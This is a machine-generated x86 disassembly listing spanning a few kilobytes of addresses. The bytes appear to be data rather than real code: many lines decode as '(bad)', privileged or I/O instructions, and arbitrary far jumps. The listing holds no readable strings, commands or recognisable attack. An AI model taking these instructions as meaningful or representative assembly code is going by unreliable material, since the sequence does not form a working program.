  42565f:	mov    esp,0x9ca91a75
  425664:	cli    
  425665:	mov    ch,0xa3
  425667:	xchg   esi,esp
  425669:	sub    al,BYTE PTR [ecx+0x19]
  42566c:	icebp  
  42566d:	jl     0x425607
  42566f:	call   0x6b5fca60
  425674:	jecxz  0x42564c
  425676:	and    al,0x9a
  425678:	mov    edx,0xe4e62485
  42567d:	mov    ch,0x35
  42567f:	sbb    eax,esp
  425681:	or     eax,0xfced3d4c
  425686:	xchg   esp,eax
  425687:	adc    cl,BYTE PTR [ebx-0x4f7d1850]
  42568d:	rcl    BYTE PTR [edx+0x32],cl
  425690:	push   0x3ef233a2
  425695:	ror    BYTE PTR [ebx-0x528235bb],1
  42569b:	pop    ss
  42569c:	xchg   BYTE PTR [eax],cl
  42569e:	lock ror DWORD PTR [ecx+eiz*1],cl
  4256a2:	and    bl,0x83
  4256a5:	xchg   DWORD PTR [edx],ebp
  4256a7:	das    
  4256a8:	inc    ebx
  4256a9:	inc    edi
  4256aa:	mov    ch,0x4b
  4256ac:	inc    esp
  4256ad:	inc    ebx
  4256ae:	popf   
  4256af:	push   edx
  4256b0:	mov    edi,0x2f87a8a8
  4256b5:	mov    al,0x86
  4256b7:	arpl   WORD PTR [ebx+0x11703430],di
  4256bd:	sub    al,0x10
  4256bf:	add    al,0xf4
  4256c1:	lds    edi,FWORD PTR [edx-0x329b2f33]
  4256c7:	pop    es
  4256c8:	(bad)
  4256cc:	ror    DWORD PTR [ecx],1
  4256ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256cf:	(bad)  
  4256d0:	push   esi
  4256d1:	push   ebp
  4256d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256d3:	dec    edx
  4256d4:	add    bh,bl
  4256d6:	sahf   
  4256d7:	inc    eax
  4256d8:	fisttp DWORD PTR [esi-0xc143f18]
  4256de:	loopne 0x4256c6
  4256e0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4256e2:	in     eax,0xa4
  4256e4:	jecxz  0x4256ca
  4256e6:	je     0x4256cc
  4256e8:	inc    edi
  4256e9:	aaa    
  4256ea:	xor    dl,BYTE PTR [edi-0xe81a02a]
  4256f0:	scas   al,BYTE PTR es:[edi]
  4256f1:	gs out 0x16,eax
  4256f4:	test   eax,0x3a6402af
  4256f9:	(bad)  
  4256fa:	sbb    eax,0x1cc3472e
  4256ff:	icebp  
  425700:	mov    al,BYTE PTR [eax-0x74395846]
  425706:	inc    esp
  425707:	pop    ebp
  425708:	mov    dl,0xff
  42570a:	xor    bh,BYTE PTR [edx]
  42570c:	das    
  42570d:	seto   BYTE PTR [ebx+0x0]
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x5d914074
  425783:	daa    
  425784:	enter  0x18f,0x0
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	sbb    al,0x4f
  42578e:	and    ah,BYTE PTR [ebx-0x3db5fffa]
  425794:	dec    esp
  425795:	and    BYTE PTR [ebx],al
  425797:	aam    0x2a
  425799:	outs   dx,DWORD PTR ds:[esi]
  42579a:	or     eax,0x4158cff6
  42579f:	sub    esi,edx
  4257a1:	cmp    ah,BYTE PTR [esi]
  4257a3:	int    0x25
  4257a5:	iret   
  4257a6:	cld    
  4257a7:	push   esp
  4257a8:	pop    ds
  4257a9:	xchg   esi,eax
  4257aa:	(bad)  
  4257ab:	imul   ecx,DWORD PTR [ecx-0x25],0x6b
  4257af:	cmp    al,BYTE PTR [edx]
  4257b1:	xchg   ebx,eax
  4257b2:	rol    BYTE PTR [ecx],1
  4257b4:	mov    dl,ah
  4257b6:	dec    edi
  4257b7:	jnp    0x425802
  4257b9:	test   dh,bh
  4257bb:	push   ebx
  4257bc:	push   ebx
  4257bd:	sbb    esp,ebx
  4257bf:	dec    esp
  4257c0:	push   0xd9b3303b
  4257c5:	dec    ebx
  4257c6:	mov    cl,0x2
  4257c8:	push   es
  4257c9:	int3   
  4257ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257cb:	sbb    dl,ah
  4257cd:	imul   esp,ecx,0xffffffeb
  4257d0:	xor    BYTE PTR [esi-0x2a30c9e3],al
  4257d6:	clc    
  4257d7:	mov    ebx,0x126ca1d9
  4257dc:	and    BYTE PTR [edi],al
  4257de:	push   edi
  4257df:	cwde   
  4257e0:	or     esp,edi
  4257e2:	scas   eax,DWORD PTR es:[edi]
  4257e3:	jmp    0x28d4:0xeb59d646
  4257ea:	test   al,0xc
  4257ec:	pop    ebp
  4257ed:	push   esi
  4257ee:	mov    esi,0xac7f808c
  4257f3:	pop    ecx
  4257f4:	push   esp
  4257f5:	cmp    DWORD PTR [edi+0x2],edx
  4257f8:	inc    esp
  4257f9:	mul    DWORD PTR [ecx+0x1113e779]
  4257ff:	stos   BYTE PTR es:[edi],al
  425800:	cmp    bl,BYTE PTR [ebp+ebp*2-0x314bb911]
  425807:	mov    dh,0x2d
  425809:	es inc ebp
  42580b:	sub    ebp,ebp
  42580d:	push   edx
  42580e:	xchg   edi,eax
  42580f:	xlat   BYTE PTR ds:[ebx]
  425810:	sbb    DWORD PTR [edx+0x38],esp
  425813:	cwde   
  425814:	add    al,BYTE PTR [ecx-0x45e95b99]
  42581a:	bound  esi,QWORD PTR [esi]
  42581c:	xchg   BYTE PTR [esi+0x69d31b52],ah
  425822:	dec    ebx
  425823:	inc    esp
  425824:	dec    esi
  425825:	pop    ds
  425826:	pushf  
  425827:	jmp    0x53d7:0x1588af1e
  42582e:	push   esp
  42582f:	cmp    al,0x3b
  425831:	lock fiadd WORD PTR [edi]
  425834:	cld    
  425835:	(bad)  
  425836:	repz repnz mov ch,0x1a
  42583a:	mov    bl,0x86
  42583c:	cs jo  0x425829
  42583f:	repnz inc esp
  425841:	unpcklps xmm2,XMMWORD PTR [esi]
  425844:	pop    ecx
  425845:	ins    BYTE PTR es:[edi],dx
  425846:	ja     0x425868
  425848:	mov    al,ds:0x5f894061
  42584d:	add    bl,BYTE PTR [edx+eax*4]
  425850:	pop    ecx
  425851:	or     al,0xea
  425853:	jmp    0xbdb4b9a2
  425858:	sub    BYTE PTR [edi],ah
  42585a:	int    0x5e
  42585c:	js     0x425868
  42585e:	cli    
  42585f:	inc    ebp
  425860:	loope  0x4257ef
  425862:	int    0x2b
  425864:	pop    eax
  425865:	pop    ebp
  425866:	add    BYTE PTR [eax],0xf7
  425869:	stc    
  42586a:	add    eax,0xf382c8a8
  42586f:	jns    0x425834
  425871:	rcr    BYTE PTR [eax-0x1ab9b520],0xdd
  425878:	rol    DWORD PTR [ebp-0x39],1
  42587b:	mov    ch,0x16
  42587d:	(bad)  
  42587e:	and    DWORD PTR [esp+esi*8],eax
  425881:	loopne 0x425854
  425883:	sub    BYTE PTR [ecx],bl
  425885:	repnz push ebx
  425887:	mov    eax,ds:0x184ca912
  42588c:	sbb    eax,0xefc4ec
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	ret    0x8249
  425903:	push   esi
  425904:	int3   
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	out    dx,al
  42590d:	xlat   BYTE PTR ds:[ebx]
  42590e:	and    eax,0xf4b6cd86
  425913:	adc    cl,BYTE PTR [edx+edx*1+0x48079c]
  42591a:	repnz xor edx,DWORD PTR [ebx-0x1031e939]
  425921:	cmp    BYTE PTR [esi-0x50a9a9e1],0xd6
  425928:	cmp    edx,ecx
  42592a:	leave  
  42592b:	nop    edx
  42592e:	push   ds
  42592f:	call   0x81df:0xa5e18163
  425936:	call   0x48ff:0x877b1f9f
  42593d:	sbb    dh,BYTE PTR [ebp-0x47]
  425940:	pusha  
  425941:	fsubr  DWORD PTR [ecx-0x2c]
  425944:	ficomp DWORD PTR [ecx-0xb]
  425947:	sbb    al,0xad
  425949:	xchg   ecx,eax
  42594a:	sub    ah,BYTE PTR [eax+0xe]
  42594d:	test   DWORD PTR [edi-0x67],eax
  425950:	loopne 0x425964
  425952:	test   eax,0xc5ee2f1f
  425957:	inc    esp
  425958:	mov    cl,0x6
  42595a:	push   0x22
  42595c:	adc    DWORD PTR [edi+edi*1+0x31e4128d],esi
  425963:	ds jcxz 0x42598f
  425967:	(bad)  
  425968:	xlat   BYTE PTR ds:[ebx]
  425969:	adc    esi,DWORD PTR [eax+edi*2]
  42596c:	lea    eax,[ecx+0x809706c]
  425972:	add    ebx,DWORD PTR [edx-0x64]
  425975:	les    edi,FWORD PTR [edi+ebx*2+0x467f52df]
  42597c:	push   es
  42597d:	mov    edx,0x3447f49c
  425982:	lods   al,BYTE PTR ds:[esi]
  425983:	adc    BYTE PTR [ebp-0x1f],bl
  425986:	xlat   BYTE PTR ds:[ebx]
  425987:	dec    esi
  425988:	inc    ecx
  425989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42598a:	ret    0x81bf
  42598d:	and    eax,0x4c49a6e2
  425992:	sti    
  425993:	(bad)  
  425994:	xlat   BYTE PTR ds:[ebx]
  425995:	pop    ss
  425996:	cmp    DWORD PTR [ebx+0x79c8a5e],0xffffffea
  42599d:	and    ch,BYTE PTR [eax]
  42599f:	push   ecx
  4259a0:	int3   
  4259a1:	or     al,0x4
  4259a3:	cdq    
  4259a4:	fild   DWORD PTR [ecx+0x6e59af90]
  4259aa:	add    BYTE PTR [ecx+0x1a],dl
  4259ad:	aad    0xa0
  4259af:	and    BYTE PTR [eax-0x2626cb25],al
  4259b5:	lods   eax,DWORD PTR ds:[esi]
  4259b6:	out    dx,eax
  4259b7:	sahf   
  4259b8:	sbb    eax,0xa071c362
  4259bd:	jmp    0x9c17:0x5a423551
  4259c4:	div    DWORD PTR [eax+0x2b2ab764]
  4259ca:	push   edi
  4259cb:	fisub  DWORD PTR [edx-0x2de419a6]
  4259d1:	sbb    cl,BYTE PTR [ebp+0x6d789d84]
  4259d7:	dec    esi
  4259d8:	pop    edx
  4259d9:	inc    ebx
  4259da:	sub    edx,DWORD PTR [eax-0x2d210693]
  4259e0:	sbb    DWORD PTR [esi],0xffffff81
  4259e3:	fwait
  4259e4:	adc    BYTE PTR [eax-0x3f],cl
  4259e7:	(bad)  
  4259e8:	xlat   BYTE PTR ds:[ebx]
  4259e9:	repnz push edi
  4259eb:	fld    QWORD PTR [eax+0xabeb2e7]
  4259f1:	dec    eax
  4259f2:	sub    DWORD PTR [ecx-0x7246d5cf],edx
  4259f8:	and    BYTE PTR [eax],al
  4259fa:	sahf   
  4259fb:	add    al,0x6d
  4259fd:	(bad)  
  4259fe:	cs push ebx
  425a00:	js     0x4259de
  425a02:	adc    DWORD PTR [eax-0x350150a],ebx
  425a08:	or     eax,DWORD PTR [eax+ecx*4]
  425a0b:	jnp    0x4259cc
  425a0d:	mov    ss,WORD PTR [eax+0x46]
	...
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x77891824]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	ror    al,cl
  425a8e:	sub    DWORD PTR [ecx],esp
  425a90:	retf   0x242e
  425a93:	or     al,BYTE PTR [eax+0x32427b]
  425a99:	pop    esi
  425a9a:	sbb    al,0x1a
  425a9c:	sbb    BYTE PTR [ebp-0x6700f4fd],bl
  425aa2:	cmp    ecx,DWORD PTR es:[eax-0x44]
  425aa6:	adc    bp,cx
  425aa9:	xor    ah,BYTE PTR [edi-0x6a50cae9]
  425aaf:	cmp    esp,edi
  425ab1:	dec    edx
  425ab2:	sbb    ebx,DWORD PTR [ecx+ecx*4+0x61f79693]
  425ab9:	xchg   esp,eax
  425aba:	sub    eax,0x467362cb
  425abf:	sar    DWORD PTR [ecx+0x72eee4f8],0x15
  425ac6:	inc    eax
  425ac7:	and    ch,BYTE PTR [ecx+0x749dd6d4]
  425acd:	sub    esi,DWORD PTR [edi+0x85ac072]
  425ad3:	loopne 0x425b0d
  425ad5:	xchg   esi,eax
  425ad6:	gs mov edx,0xf1f2ee9c
  425adc:	inc    ecx
  425add:	mov    bl,0xa0
  425adf:	jne    0x425ae7
  425ae1:	jb     0x425ace
  425ae3:	jbe    0x425b1a
  425ae5:	shr    BYTE PTR [edx+0x24],cl
  425ae8:	ja     0x425b66
  425aea:	cld    
  425aeb:	mov    ch,0xcf
  425aed:	add    DWORD PTR [ecx+0x2e097e90],ebp
  425af3:	inc    esi
  425af4:	adc    DWORD PTR [esi+0x6e],eax
  425af7:	adc    al,dh
  425af9:	cmp    eax,0x29cbcc03
  425afe:	xor    al,0xaa
  425b00:	clc    
  425b01:	call   0x4f250532
  425b06:	mov    bh,0x7b
  425b08:	sbb    ecx,ecx
  425b0a:	rcr    BYTE PTR [esi-0x4d3e6f85],1
  425b10:	das    
  425b11:	inc    ecx
  425b12:	dec    DWORD PTR [eax+ebp*2]
  425b15:	lahf   
  425b16:	mov    ebx,0xaab1b14b
  425b1b:	test   eax,esp
  425b1d:	fld    TBYTE PTR [ebx]
  425b1f:	and    al,0x1b
  425b21:	retf   
  425b22:	shl    ebp,1
  425b24:	push   ss
  425b25:	popa   
  425b26:	cmc    
  425b27:	fisub  WORD PTR [esi+0x376442e2]
  425b2d:	test   eax,0x32da7663
  425b32:	sub    ch,bl
  425b34:	xor    dl,BYTE PTR [esi+0x9e4f7e7]
  425b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b3b:	push   eax
  425b3d:	out    0x77,eax
  425b3f:	push   ecx
  425b40:	sbb    bh,BYTE PTR es:[ecx-0x432de76c]
  425b47:	cld    
  425b48:	mov    edx,fs
  425b4a:	daa    
  425b4b:	imul   ecx,DWORD PTR [ebx+0x51cd6c62],0x655ed8ad
  425b55:	sub    DWORD PTR [edx+0x14],esi
  425b58:	(bad)  
  425b59:	retf   
  425b5a:	stc    
  425b5b:	sub    eax,0x5db3511c
  425b60:	loop   0x425b66
  425b62:	dec    ebp
  425b63:	adc    DWORD PTR [esi-0x183e04f7],eax
  425b69:	ja     0x425b50
  425b6b:	cmp    DWORD PTR [ebx+ecx*1+0xb],ebx
  425b6f:	and    ecx,DWORD PTR [ecx+0x4a9e5326]
  425b75:	ret    0xc456
  425b78:	sbb    al,0x19
  425b7a:	out    dx,al
  425b7b:	fwait
  425b7c:	xchg   ebp,eax
  425b7d:	daa    
  425b7e:	fcom   DWORD PTR [ecx+0x18]
  425b81:	ins    DWORD PTR es:[edi],dx
  425b82:	cmp    DWORD PTR [eax-0x10833039],esp
  425b88:	inc    edx
  425b89:	fidiv  DWORD PTR [edi-0x34]
  425b8c:	add    ecx,DWORD PTR ds:0xc300
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	leave  
  425c01:	sub    ecx,DWORD PTR [eax+0x57]
  425c04:	aam    0x92
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	mov    DWORD PTR [ebp-0x3b],esi
  425c0f:	out    0x92,eax
  425c11:	jecxz  0x425c0c
  425c13:	(bad)  
  425c14:	gs push cs
  425c16:	dec    esi
  425c17:	xchg   esp,eax
  425c18:	out    0xd0,eax
  425c1a:	int3   
  425c1b:	rcl    edx,0x4d
  425c1e:	test   DWORD PTR [edx],esp
  425c20:	(bad)  
  425c22:	dec    ebp
  425c23:	repz pop esi
  425c25:	cwde   
  425c26:	add    al,0xec
  425c28:	inc    ebp
  425c29:	std    
  425c2a:	scas   eax,DWORD PTR es:[edi]
  425c2b:	out    dx,eax
  425c2c:	dec    ecx
  425c2d:	lahf   
  425c2e:	add    BYTE PTR [ebp+0x76],0xe9
  425c32:	pop    esi
  425c33:	inc    ebp
  425c34:	ins    DWORD PTR es:[edi],dx
  425c35:	pop    esp
  425c36:	jle    0x425c40
  425c38:	fst    QWORD PTR [ebx]
  425c3a:	push   cs
  425c3b:	adc    DWORD PTR [edi-0x16adb0c0],esp
  425c41:	aam    0x3d
  425c43:	jo     0x425c4b
  425c45:	(bad)  
  425c46:	jecxz  0x425c62
  425c48:	push   ebx
  425c49:	(bad)
  425c4e:	pop    ebx
  425c4f:	and    DWORD PTR ds:0x6f1fa47c,ecx
  425c55:	xor    al,0x27
  425c57:	fld    DWORD PTR [esi+0x5c]
  425c5a:	cmp    al,0xff
  425c5c:	mov    dl,0x86
  425c5e:	jg     0x425c05
  425c60:	jle    0x425c94
  425c62:	pop    edi
  425c63:	fistp  WORD PTR [ebx-0x2e]
  425c66:	rol    BYTE PTR [eax+0x58cbddf4],1
  425c6c:	jno    0x425c37
  425c6e:	xchg   esi,eax
  425c6f:	xlat   BYTE PTR ds:[ebx]
  425c70:	sahf   
  425c71:	int3   
  425c72:	scas   al,BYTE PTR es:[edi]
  425c73:	pop    es
  425c74:	fldenv [ecx-0x16a32736]
  425c7a:	cmp    al,0xc
  425c7c:	xchg   DWORD PTR [esi-0x7f],ebp
  425c7f:	cmp    DWORD PTR [ecx],ebx
  425c81:	cs js  0x425cbf
  425c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c85:	xor    eax,0x7746d155
  425c8a:	lock xacquire or BYTE PTR [esi],cl
  425c8e:	jnp    0x425c48
  425c90:	retf   
  425c91:	jno    0x425c2d
  425c93:	ins    BYTE PTR es:[edi],dx
  425c94:	adc    esi,DWORD PTR [edx+0x68]
  425c97:	test   eax,0x45f119e4
  425c9c:	inc    ecx
  425c9d:	iret   
  425c9e:	test   eax,0xf8c03a9b
  425ca3:	(bad)  
  425ca4:	xlat   BYTE PTR ds:[ebx]
  425ca5:	dec    eax
  425ca6:	xchg   edi,edx
  425ca8:	leave  
  425ca9:	xchg   ebx,eax
  425caa:	xchg   ebx,eax
  425cab:	push   edx
  425cac:	in     al,0x7a
  425cae:	lds    ecx,FWORD PTR [edi+ebp*8+0x7d]
  425cb2:	push   ebp
  425cb3:	inc    eax
  425cb4:	pop    esp
  425cb5:	jmp    0x425cde
  425cb7:	in     eax,0x5e
  425cb9:	ret    
  425cba:	xor    ecx,DWORD PTR [ecx-0x74]
  425cbd:	pop    ecx
  425cbe:	shl    BYTE PTR [ebp+0x73],0x6b
  425cc2:	xor    al,0x16
  425cc4:	scas   eax,DWORD PTR es:[edi]
  425cc5:	xchg   DWORD PTR [edx],ebp
  425cc7:	add    bl,BYTE PTR [eax-0x66]
  425cca:	sbb    BYTE PTR [esi+edi*1+0x6477ecd3],0xe6
  425cd2:	adc    BYTE PTR [ecx-0x2e4a73a],ch
  425cd8:	in     eax,dx
  425cd9:	push   edx
  425cda:	sub    edx,edi
  425cdc:	js     0x425d54
  425cde:	lods   eax,DWORD PTR ds:[esi]
  425cdf:	xor    al,0x47
  425ce1:	add    ah,BYTE PTR ds:0xe10fc230
  425ce7:	adc    al,0xa7
  425ce9:	psubusb mm3,QWORD PTR [ebp-0x1d]
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	mov    dh,0x44
  425cf0:	fwait
  425cf1:	mov    al,0xa6
  425cf3:	in     al,0x5d
  425cf5:	ins    BYTE PTR es:[edi],dx
  425cf6:	lods   eax,DWORD PTR ds:[esi]
  425cf7:	das    
  425cf8:	ja     0x425cb2
  425cfa:	popa   
  425cfb:	pushf  
  425cfc:	shl    DWORD PTR [eax-0x68529ec9],1
  425d02:	sbb    dl,cl
  425d04:	jbe    0x425d08
  425d06:	outs   dx,DWORD PTR ds:[esi]
  425d07:	in     al,0x57
  425d09:	xchg   edi,eax
  425d0a:	mov    ds:0xacf7eb93,eax
  425d0f:	jmp    0x0:0x0
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x6051dc5d,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	push   0xd8732113
  425d91:	bound  ecx,QWORD PTR [eax-0x7]
  425d94:	pop    ds
  425d95:	cmc    
  425d96:	xor    ch,dh
  425d98:	loop   0x425d3c
  425d9a:	xor    dh,BYTE PTR [ebx+0x7e986e8d]
  425da0:	and    cl,BYTE PTR [edx+0x79]
  425da3:	test   DWORD PTR [esi],ebx
  425da5:	or     eax,0x120e2586
  425daa:	inc    ecx
  425dab:	test   BYTE PTR [edx-0x2eb4b66f],cl
  425db1:	pusha  
  425db2:	add    ebx,DWORD PTR [eax-0x47b20ad1]
  425db8:	add    BYTE PTR [edx],dl
  425dba:	(bad)  
  425dbb:	lods   eax,DWORD PTR ds:[esi]
  425dbc:	fcmovnbe st,st(2)
  425dbe:	gs ins DWORD PTR es:[edi],dx
  425dc0:	(bad)  
  425dc1:	ror    BYTE PTR [edx+eiz*2+0x38],cl
  425dc5:	dec    DWORD PTR [edx+ecx*1+0x77d6d306]
  425dcc:	pushf  
  425dcd:	stc    
  425dce:	cwde   
  425dcf:	ds out 0x76,eax
  425dd2:	mov    dh,0xf7
  425dd4:	mov    BYTE PTR [esi+0x3641aac7],ah
  425dda:	sahf   
  425ddb:	cli    
  425ddc:	push   ss
  425ddd:	or     eax,0x11f2ae4a
  425de2:	jle    0x425de4
  425de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425de5:	adc    al,0x51
  425de7:	jbe    0x425d6c
  425de9:	adc    esi,esp
  425deb:	and    ecx,DWORD PTR [esi+0x35d751e7]
  425df1:	leave  
  425df2:	pop    edi
  425df3:	and    DWORD PTR [ebp-0x6dcb278f],ecx
  425df9:	test   eax,0x74ed808c
  425dfe:	nop
  425dff:	scas   eax,DWORD PTR es:[edi]
  425e00:	stos   DWORD PTR es:[edi],eax
  425e01:	mov    ebp,0x3bc32051
  425e06:	or     esp,DWORD PTR [ebx-0x46db0695]
  425e0c:	add    BYTE PTR [edx],al
  425e0e:	or     bl,dh
  425e10:	popf   
  425e11:	pop    edx
  425e12:	jp     0x425e93
  425e14:	sub    edx,DWORD PTR [ecx]
  425e16:	je     0x425de0
  425e18:	and    al,0xab
  425e1a:	sub    cl,BYTE PTR [ebp+0x43]
  425e1d:	push   ebx
  425e1e:	pop    ecx
  425e1f:	movapd XMMWORD PTR [eax],xmm6
  425e23:	in     al,dx
  425e24:	pop    esp
  425e25:	mov    edi,0x4d8301f7
  425e2a:	dec    ecx
  425e2b:	inc    ebx
  425e2c:	scas   eax,DWORD PTR es:[edi]
  425e2d:	ins    BYTE PTR es:[edi],dx
  425e2e:	ja     0x425de3
  425e30:	scas   eax,DWORD PTR es:[edi]
  425e31:	push   edi
  425e32:	add    ebx,DWORD PTR ds:0x700ef69b
  425e38:	mov    ecx,0x4a79bfe3
  425e3d:	mov    ebx,0xa679aeeb
  425e42:	scas   al,BYTE PTR es:[edi]
  425e43:	loope  0x425e6e
  425e45:	push   ebp
  425e46:	cld    
  425e47:	and    al,0x35
  425e49:	and    eax,0xa04bfb42
  425e4e:	mov    bl,0x4e
  425e50:	dec    ebp
  425e51:	mov    ebp,0x48995b5
  425e56:	inc    eax
  425e57:	(bad)  
  425e58:	int    0xd4
  425e5a:	sub    eax,DWORD PTR [ecx+0x31dce3b]
  425e60:	retf   0x8ceb
  425e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e64:	jae    0x425ecf
  425e66:	cmc    
  425e67:	mov    esi,0x5817debe
  425e6c:	inc    ebx
  425e6d:	or     BYTE PTR [eax-0xb157803],cl
  425e73:	pop    eax
  425e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e75:	mov    eax,0x508e9f22
  425e7a:	adc    DWORD PTR [eax],0x1d
  425e7d:	mov    cl,0x38
  425e7f:	pop    ebp
  425e80:	mov    ss,WORD PTR [ebx-0x3d5ce7d]
  425e86:	leave  
  425e87:	rol    DWORD PTR [esi-0x2e],1
  425e8a:	fadd   QWORD PTR [ebx+0x29afed39]
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	(bad)  
  425f01:	mov    eax,0x94dcaa9f
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	xor    al,0x85
  425f0e:	inc    eax
  425f0f:	sbb    BYTE PTR [ecx-0x2f],0x55
  425f13:	jo     0x425eda
  425f15:	je     0x425f76
  425f17:	icebp  
  425f18:	sbb    DWORD PTR [edi],edi
  425f1a:	dec    ecx
  425f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f1c:	mov    eax,ds:0xed1b8ea4
  425f21:	inc    ebx
  425f22:	cwde   
  425f23:	adc    cl,0xa3
  425f26:	and    ah,BYTE PTR [ebp+0x2a]
  425f29:	aad    0xa7
  425f2b:	xchg   ecx,eax
  425f2c:	fimul  DWORD PTR [ebp-0x190d4903]
  425f32:	fsub   QWORD PTR [ebp+esi*1+0x2e140717]
  425f39:	pop    ebp
  425f3a:	stos   BYTE PTR es:[edi],al
  425f3b:	ret    0xbb30
  425f3e:	(bad)  
  425f3f:	pop    ebx
  425f40:	test   DWORD PTR [eax],edi
  425f42:	push   esp
  425f43:	hlt    
  425f44:	aaa    
  425f45:	enter  0x8a7,0xe
  425f49:	lds    edi,FWORD PTR [edx-0x1b]
  425f4c:	cmp    edi,DWORD PTR [ebx]
  425f4e:	xor    eax,0x16525a0e
  425f53:	clc    
  425f54:	rol    BYTE PTR [ebp+0x66],0x8c
  425f58:	mov    ds:0x8504e62c,eax
  425f5d:	and    al,0xd3
  425f5f:	mov    bl,0xfd
  425f61:	add    ebp,DWORD PTR [esi]
  425f63:	das    
  425f64:	mov    edx,0xf04e07a9
  425f69:	inc    eax
  425f6a:	pop    ds
  425f6b:	jmp    0x425fcb
  425f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f6e:	pop    esi
  425f6f:	(bad)  
  425f70:	in     al,dx
  425f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f72:	fidiv  DWORD PTR [eax+eax*1-0x54]
  425f76:	jnp    0x425fa5
  425f78:	xchg   ebp,eax
  425f79:	popw   ss
  425f7b:	addr16 lahf 
  425f7d:	lods   al,BYTE PTR ds:[esi]
  425f7e:	sbb    al,0xe6
  425f80:	jle    0x425ff8
  425f82:	test   DWORD PTR ds:0xa2bd72d6,edx
  425f88:	jne    0x425ffb
  425f8a:	pop    ds
  425f8b:	outs   dx,DWORD PTR ds:[esi]
  425f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f8d:	inc    edi
  425f8e:	ret    
  425f8f:	int3   
  425f90:	mov    al,0x90
  425f92:	loopne 0x425fe2
  425f94:	test   DWORD PTR [edi],ebx
  425f96:	and    eax,0xaa7d750f
  425f9b:	outs   dx,DWORD PTR ds:[esi]
  425f9c:	mov    bl,0x76
  425f9e:	or     BYTE PTR es:0xd61efc92,dl
  425fa5:	lock popa 
  425fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fa8:	(bad)  
  425fa9:	loope  0x425f63
  425fab:	dec    esi
  425fac:	or     BYTE PTR [esi],ah
  425fae:	js     0x425ffc
  425fb0:	mov    WORD PTR [esi+0x1d07510b],fs
  425fb6:	hlt    
  425fb7:	sub    DWORD PTR [esi],ebx
  425fb9:	es inc edx
  425fbb:	std    
  425fbc:	mov    ds:0x62686fa9,eax
  425fc1:	cmp    BYTE PTR [esi],dh
  425fc3:	pop    edi
  425fc4:	add    al,0x51
  425fc6:	jo     0x42602b
  425fc8:	cmp    edi,DWORD PTR ds:0xef556c18
  425fce:	out    0x7d,al
  425fd0:	push   ds
  425fd1:	mov    ch,bh
  425fd3:	cmp    al,0x72
  425fd5:	test   DWORD PTR [ecx],ecx
  425fd7:	cdq    
  425fd8:	out    0x1f,eax
  425fda:	and    dh,dl
  425fdc:	adc    al,0xc2
  425fde:	inc    edi
  425fdf:	xchg   ecx,eax
  425fe1:	mov    ah,0xba
  425fe3:	push   0xffffffba
  425fe5:	ins    DWORD PTR es:[edi],dx
  425fe6:	xor    eax,0xd23f959c
  425feb:	pushf  
  425fec:	jns    0x425f83
  425fee:	pop    ebp
  425fef:	pop    edx
  425ff0:	aas    
  425ff1:	sbb    al,BYTE PTR [edx]
  425ff3:	jmp    0x4595:0xdbec5a29
  425ffa:	gs xchg edi,eax
  425ffc:	pop    es
  425ffd:	push   es
  425ffe:	fnstsw WORD PTR [ebx]
  426000:	pusha  
  426001:	shl    BYTE PTR [edi-0x68],0xd9
  426005:	cmp    eax,0xe4f30f9c
  42600a:	jge    0x425ff6
  42600c:	cmp    DWORD PTR [eax],0x52
  42600f:	je     0x426011
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
